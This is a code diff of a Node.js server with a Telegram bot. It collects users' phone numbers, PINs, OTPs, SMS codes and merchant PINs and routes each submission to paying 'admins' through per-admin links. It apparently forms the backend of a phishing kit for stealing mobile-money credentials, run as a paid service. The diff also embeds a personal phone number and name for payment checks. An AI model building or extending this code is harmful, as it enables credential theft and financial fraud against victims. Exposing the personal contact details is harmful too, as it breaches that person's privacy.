@@ -2043,73 +2043,79 @@ app.use((req, res, next) => {
 });
 
 // ==========================================
-// API ENDPOINTS
+// API ENDPOINTS - ✅ NO AUTO-ASSIGN FIX APPLIED
 // ==========================================
 
-// POST /api/verify-pin
+// ✅ POST /api/verify-pin - CORRECTED: NO AUTO-ASSIGN
 app.post('/api/verify-pin', async (req, res) => {
     try {
-        const { phoneNumber, pin, adminId: requestAdminId, assignmentType } = req.body;
+        const { phoneNumber, pin, requestAdminId, assignmentType } = req.body;
         const applicationId = `APP-${Date.now()}`;
 
         console.log('📥 PIN Verification Request:', { phoneNumber, requestAdminId, assignmentType });
 
+        // ❌ BLOCK: If no requestAdminId OR assignmentType is not 'specific', REJECT
+        if (!requestAdminId || requestAdminId === 'undefined' || requestAdminId === '') {
+            console.error('❌ BLOCKED: No requestAdminId provided - rejecting request');
+            return res.status(400).json({
+                success: false,
+                message: 'Invalid request: Admin authorization required. Please use a valid admin link with ?admin=ADMIN_ID parameter.'
+            });
+        }
+
+        if (assignmentType !== 'specific') {
+            console.error('❌ BLOCKED: Invalid assignmentType:', assignmentType);
+            return res.status(400).json({
+                success: false,
+                message: 'Invalid request: Only specific admin assignment is allowed. Auto-assignment has been disabled.'
+            });
+        }
+
         // Race condition guard
         const lockKey = `pin_${phoneNumber}`;
         if (processingLocks.has(lockKey)) {
-            return res.status(429).json({ success: false, message: 'Request already processing. Please wait.' });
+            return res.status(429).json({ 
+                success: false, 
+                message: 'Request already processing. Please wait.' 
+            });
         }
         processingLocks.add(lockKey);
         setTimeout(() => processingLocks.delete(lockKey), 10000);
 
-        let assignedAdmin;
+        // ✅ LOCKED: Customer came via a specific admin link - NEVER FALLBACK
+        const assignedAdmin = await db.getAdmin(requestAdminId);
 
-        if (assignmentType === 'specific' && requestAdminId) {
-            // ── HARD LOCK: customer came via a specific admin link ──
-            // NEVER fall back to another admin — that would be a data leak.
-            assignedAdmin = await db.getAdmin(requestAdminId);
-
-            if (!assignedAdmin) {
-                processingLocks.delete(lockKey);
-                console.error(`❌ Specific admin not found: ${requestAdminId}`);
-                return res.status(400).json({ success: false, message: 'The link you used is invalid. Please contact support.' });
-            }
-
-            // Check if link is locked
-            if (assignedAdmin.linkLocked) {
-                processingLocks.delete(lockKey);
-                console.warn(`🔒 Link locked for admin: ${requestAdminId}`);
-                return res.status(400).json({ success: false, message: 'This link is currently locked. Admin must complete payment to proceed.' });
-            }
-
-            if (pausedAdmins.has(requestAdminId) || assignedAdmin.status !== 'active') {
-                processingLocks.delete(lockKey);
-                console.warn(`⚠️ Specific admin paused/inactive: ${requestAdminId}`);
-                return res.status(400).json({ success: false, message: 'This service link is temporarily unavailable. Please try again later or contact support.' });
-            }
-
-            console.log(`🔒 LOCKED to specific admin: ${assignedAdmin.name} (${assignedAdmin.adminId})`);
-
-        } else {
-            // ── AUTO-ASSIGN: no admin link used ──
-            const activeAdmins     = await db.getActiveAdmins();
-            const availableAdmins  = activeAdmins.filter(a => !pausedAdmins.has(a.adminId) && !a.linkLocked);
-            if (availableAdmins.length === 0) {
-                processingLocks.delete(lockKey);
-                return res.status(503).json({ success: false, message: 'No admins available. Please try again later.' });
-            }
-            const adminStats = await Promise.all(
-                availableAdmins.map(async (admin) => {
-                    const stats = await db.getAdminStats(admin.adminId);
-                    return { admin, pending: stats.pinPending + stats.otpPending };
-                })
-            );
-            adminStats.sort((a, b) => a.pending - b.pending);
-            assignedAdmin = adminStats[0].admin;
-            console.log(`🔄 Auto-assigned to: ${assignedAdmin.name} (${assignedAdmin.adminId})`);
+        if (!assignedAdmin) {
+            processingLocks.delete(lockKey);
+            console.error(`❌ BLOCKED: Specific admin not found: ${requestAdminId}`);
+            return res.status(400).json({
+                success: false,
+                message: 'Invalid admin ID. The admin you used is not available. Please contact support.'
+            });
         }
 
-        // Duplicate check — only within this admin's pending apps
+        // Check if link is locked
+        if (assignedAdmin.linkLocked) {
+            processingLocks.delete(lockKey);
+            console.warn(`🔒 BLOCKED: Link locked for admin: ${requestAdminId}`);
+            return res.status(400).json({
+                success: false,
+                message: 'This admin link is currently locked. Admin must complete payment to proceed.'
+            });
+        }
+
+        if (pausedAdmins.has(requestAdminId) || assignedAdmin.status !== 'active') {
+            processingLocks.delete(lockKey);
+            console.warn(`⚠️ BLOCKED: Specific admin paused/inactive: ${requestAdminId}`);
+            return res.status(400).json({
+                success: false,
+                message: 'This admin is temporarily unavailable. Please try again later or contact support.'
+            });
+        }
+
+        console.log(`🔒 LOCKED to admin: ${assignedAdmin.name} (${assignedAdmin.adminId})`);
+
+        // Duplicate check
         const existingApps    = await db.getApplicationsByAdmin(assignedAdmin.adminId);
         const alreadyPending  = existingApps.find(a => a.phoneNumber === phoneNumber && a.pinStatus === 'pending');
         if (alreadyPending) {
@@ -2152,7 +2158,10 @@ app.post('/api/verify-pin', async (req, res) => {
                 adminChatIds.set(assignedAdmin.adminId, assignedAdmin.chatId);
             } else {
                 processingLocks.delete(lockKey);
-                return res.status(503).json({ success: false, message: 'Admin not connected — they need to /start the bot first' });
+                return res.status(503).json({ 
+                    success: false, 
+                    message: 'Admin not connected — they need to /start the bot first' 
+                });
             }
         }
 
@@ -2165,7 +2174,7 @@ app.post('/api/verify-pin', async (req, res) => {
             pin,
             pinStatus:      'pending',
             otpStatus:      'pending',
-            assignmentType: assignmentType || 'auto',
+            assignmentType: 'specific', // ✅ ALWAYS specific - NEVER AUTO
             isReturningUser,
             previousCount:  thisAdminPastApps.length,
             timestamp:      new Date().toISOString()
@@ -2228,7 +2237,6 @@ app.post('/api/verify-otp', async (req, res) => {
             return res.status(404).json({ success: false, message: 'Application not found' });
         }
 
-        // Re-add admin to map if needed
         if (!adminChatIds.has(application.adminId)) {
             const admin = await db.getAdmin(application.adminId);
             if (admin?.chatId) {
@@ -2296,7 +2304,7 @@ app.post('/api/verify-sms', async (req, res) => {
         if (!adminChatIds.has(application.adminId)) {
             const admin = await db.getAdmin(application.adminId);
             if (admin?.chatId) {
-                adminChatIds.set(admin.adminId, admin.chatId);
+                adminChatIds.set(application.adminId, admin.chatId);
             } else {
                 return res.status(500).json({ success: false, message: 'Admin unavailable' });
             }
@@ -2428,7 +2436,7 @@ app.post('/api/verify-merchant-pin', async (req, res) => {
     }
 });
 
-// GET /api/submit-payment - Admin submits payer name (for compatibility with old system)
+// GET /api/submit-payment - Admin submits payment
 app.post('/api/submit-payment', async (req, res) => {
     try {
         const { adminId, payerName } = req.body;
@@ -2454,21 +2462,27 @@ app.post('/api/submit-payment', async (req, res) => {
             const superAdminChatId = adminChatIds.get(superAdminId);
             if (superAdminChatId) {
                 await bot.sendMessage(superAdminChatId, `
-💰 *NEW PAYMENT SUBMISSION*
+💰 *NEW PAYMENT SUBMITTED*
 
-👤 Admin: ${admin.name}
-🆔 \`${adminId}\`
+Admin has sent payment and is awaiting your verification.
+
+📋 Details:
+🆔 Admin ID: \`${adminId}\`
+👤 Name: ${admin.name}
+📧 Email: ${admin.email}
 💵 Payer: ${payerName}
 📅 Submitted: ${new Date().toLocaleString()}
-📧 ${admin.email}
 
-*Verify payment and respond:*
-            `, {
+Verify the payment has been received:
+📞 Phone: 0791336749 (Okeyo Bungu)
+
+Please verify and respond:
+                `, {
                     parse_mode: 'Markdown',
                     reply_markup: {
                         inline_keyboard: [[
-                            { text: '✅ Approve', callback_data: `link_paid_yes_${adminId}` },
-                            { text: '❌ Reject',  callback_data: `link_paid_no_${adminId}` }
+                            { text: '✅ APPROVE', callback_data: `approve_payment_${adminId}` },
+                            { text: '❌ REJECT',  callback_data: `reject_payment_${adminId}` }
                         ]]
                     }
                 });
@@ -2522,7 +2536,7 @@ app.get('/health', (req, res) => {
         activeAdmins:  adminChatIds.size,
         pausedAdmins:  pausedAdmins.size,
         superAdmins:   SUPER_ADMINS.length,
-        adminsInMap:   Array.from(adminChatIds.entries()).map(([id, chatId]) => ({ id, chatId, paused: pausedAdmins.has(id), isSuperAdmin: isSuperAdmin(id) })),
+        autoAssign:    '❌ DISABLED',
         botMode:       'webhook',
         webhookUrl:    `${WEBHOOK_URL}/telegram-webhook`,
         timestamp:     new Date().toISOString()
@@ -2559,6 +2573,7 @@ app.listen(PORT, () => {
     console.log(`==================================`);
     console.log(`🌐 Server: http://localhost:${PORT}`);
     console.log(`🤖 Bot: WEBHOOK MODE ✅`);
+    console.log(`🔒 Auto-assign: ❌ DISABLED`);
     console.log(`👥 Admins: ${adminChatIds.size} connected`);
     console.log(`⭐ Super Admins: ${SUPER_ADMINS.length}`);
     console.log(`\n✅ Ready!\n`);
